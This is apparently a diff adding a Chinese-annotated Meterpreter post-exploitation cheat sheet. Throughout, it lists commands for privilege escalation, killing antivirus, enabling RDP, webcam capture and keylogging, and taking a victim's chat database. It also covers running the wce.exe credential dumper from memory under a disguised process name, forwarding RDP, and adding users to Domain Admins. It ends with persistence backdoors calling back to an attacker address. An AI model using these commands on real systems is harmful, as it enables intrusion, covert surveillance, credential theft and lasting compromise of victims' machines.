@@ -1,0 +1,230 @@
+++++++++++++++++++++++++++meterpreter++++++++++++++++++++++++++
+|getpid
+
+|ps
+
+|migrate
+
+|run post/windows/manage/migrate
+
+|getsystem
+
+|run post/windows/manage/killav
+
+|run post/windows/gather/checkvm
+
+|idletime
+
+|getuid
+
+|run  get_local_subnets
+
+|run post/windows/gather/autoroute
+
+|run post/windows/manage/enable_rdp
+
+|run post/windows/gather/enum_applications
+
+|sysinfo
+
+|screenshot
+
+|webcam list
+
+|webcam_snap
+
+|webcam_stream
+
+
+________________________________________system oprerate command_____________________________________________________
+
+cat c:\boot.ini#查看文件内容,文件必须存在
+
+del c:\boot.ini #删除指定的文件
+
+upload /root/Desktop/netcat.exe c:\ # 上传文件到目标机主上
+
+如upload  setup.exe C:\\windows\\system32\download nimeia.txt /root/Desktop/   
+
+# 下载文件到本机上如：
+
+download C:\\boot.ini /root/
+
+或者
+
+download C:\\"ProgramFiles"\\Tencent\\QQ\\Users\\295******125\\Msg2.0.db /root/
+
+edit c:\boot.ini  # 编辑文件
+
+getlwd#打印本地目录
+
+getwd#打印工作目录
+
+lcd#更改本地目录
+
+ls#列出在当前目录中的文件列表
+
+lpwd#打印本地目录
+
+pwd#输出工作目录
+
+cd c:\\ #进入目录文件下
+
+rm file #删除文件
+
+mkdir dier #在受害者系统上的创建目录
+
+rmdir#受害者系统上删除目录
+
+dir#列出目标主机的文件和文件夹信息
+
+mv#修改目标主机上的文件名
+
+search -d d:\\www -f web.config #search 文件，如search  -d c:\\  -f*.doc
+
+meterpreter > search -f autoexec.bat  #搜索文件
+
+meterpreter > search -f sea*.bat c:\\xamp\\
+
+enumdesktops     #用户登录数
+
+keyscan_start：开启键盘记录功能
+
+keyscan_dump：显示捕捉到的键盘记录信息
+
+keyscan_stop：停止键盘记录功能
+
+[+][+][+][+][+]execute
+
+execute -H -f notepad.exe
+
+我们运行目标主机上的cmd.exe程序，并以隐藏的方式直接交互到我们的meterpreter会话上
+
+命令：
+
+execute  -H -i -f cmd.exe
+
+在目标主机内存中直接执行我们攻击主机上的攻击程序，比如wce.exe，又比如木马等，这样可以避免攻击程序存储到目标主机硬盘上被发现或被查杀。
+
+execute  -H -m -d notepad.exe -f  wce.exe -a "-o wce.txt"
+
+-d 在目标主机执行时显示的进程名称（用以伪装）
+
+-m 直接从内存中执行
+
+-o wce.txt"是wce.exe的运行参数
+
+[+][+][+][+]portfwd
+
+portfwd -h
+
+用法：portfwd [-h] [add | delete | list | flush] [args]
+
+ 
+
+选项：
+
+    -L <opt>要监听的本地主机（可选）
+
+    -h帮助横幅
+
+    -l <opt>要监听的本地端口
+
+    -p <opt>连接到的远程端口
+
+    -r <opt>要连接到的远程主机
+
+portfwd  add -l 4444 -p 3389 -r 192.168.1.102 # 端口转发,本机监听4444,把目标机3389转到本机4444
+
+netstat -an | grep“4444"  #查看指定端口开放情况
+
+rdesktop -u Administrator -p bk#123 127.0.0.1:4444 #使用rdesktop来连接桌面，-u 用户名 -p 密码
+
+rdesktop 127.1.1.0:4444 #需要输入用户名和密码远程连接
+
+route#查看或修改受害者路由表
+
+route add 192.168.1.0 255.255.255.0 1 #添加动态路由
+
+route print #路由表输出
+
+runget_local_subnets #目标主机的内网IP段情况
+
+Arp       #看ARP缓冲表
+
+Getproxy     #获取代理
+
+[+]systemcommand
+
+系统命令
+
+reboot#重新启动受害人的计算机
+
+reg#与受害人的注册表进行交互
+
+rev2self#回到控制目标主机的初始用户账户下
+
+shell#获得控制台权限
+
+shutdown#关闭了受害者的计算机
+
+sysinfo # 查看目标机系统信息，如机器名，操作系统等
+
+add_user username password -h ip    #在远程目标主机上添加一个用户
+
+add_group_user "Domain Admins" username -h ip    #将用户添加到目标主机的域管理员组中
+
+shell命令
+
+[+]backdoor
+
+ run metsvc
+
+msf exploit(handler) > use exploit/multi/handler
+
+msf exploit(handler) > set payload windows/metsvc_bind_tcp
+
+persistence模块后门
+
+一个vbs后门写入了开机启动项但是容易被发现还是需要大家发挥自己的智慧:)
+
+meterpreter > run persistence -X -i 5 -p 23333 -r 10.42.0.1
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
